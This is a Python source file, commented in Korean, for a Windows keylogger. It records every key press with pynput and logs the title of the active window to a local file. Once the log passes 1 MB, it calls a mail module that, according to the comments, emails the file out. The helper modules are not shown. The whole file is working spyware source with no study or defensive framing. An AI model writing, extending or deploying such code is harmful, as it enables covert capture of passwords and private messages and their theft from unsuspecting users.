import os
import time
import winreg
import mailmanager
import filemanager
import winmanager
from threading import Thread
from pynput.keyboard import Key, Listener

# 어떤 키가 기록되고 있는지 보여주는 함수

def getPress(key):
    filemanager.logThisFile(key)
    print(key)

# 윈도우 타이틀 검사 함수

def getTitle():
    oldtitle = winmanager.getCurrentTitle()
    while True:
        time.sleep(0.1)
        if winmanager.getCurrentTitle() != oldtitle and winmanager.getCurrentTitle() == "":
            filemanager.logThisFile("\n" + "----------바탕 화면----------" + "\n")
        else:
            filemanager.logThisFile("\n" + "----------" + winmanager.getCurrentTitle() + "----------" + "\n")
        oldtitle = winmanager.getCurrentTitle()



# 다 쓴 파일을 메일로 보내는 함수

def getFileSize():
    MAX_FILE_SIZE = 1048576 # 정보가 기록될 파일의 크기 한계치 1mb
    while True:
        try:
            time.sleep(1)
            if filemanager.detectfileSize() > MAX_FILE_SIZE:
                print("파일 크기 초과")
                mailmanager.main()
        except FileNotFoundError:
            print("파일이 아직 작성되지 않았습니다...")



# 메인 함수

def main():
    with Listener(on_press = getPress) as listener:
        listener.join()



# 멀티쓰레딩

mainThread = Thread(target=main)
getWindowTitle_Thread = Thread(target=getTitle)
getFileSize_Thread = Thread(target=getFileSize)

mainThread.start()
getWindowTitle_Thread.start()
getFileSize_Thread.start()